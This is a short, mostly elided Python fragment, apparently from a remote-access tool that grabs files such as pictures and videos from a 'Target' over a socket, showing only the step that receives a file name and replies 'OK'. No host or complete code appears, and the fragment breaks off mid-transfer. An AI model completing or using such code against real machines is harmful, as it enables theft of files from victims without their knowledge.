    ...
    while True:
        try:
            ...
            # Example: grab picture.jpg !!!
                ...
                # Receiving Response From Target
                # e.g., OK Response
            ...
            # Example: video.mp4 !!!
                ...
                # Receiving Name Of File To Be Transferred
                file_name = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Receiving Size Of File To Be Transferred
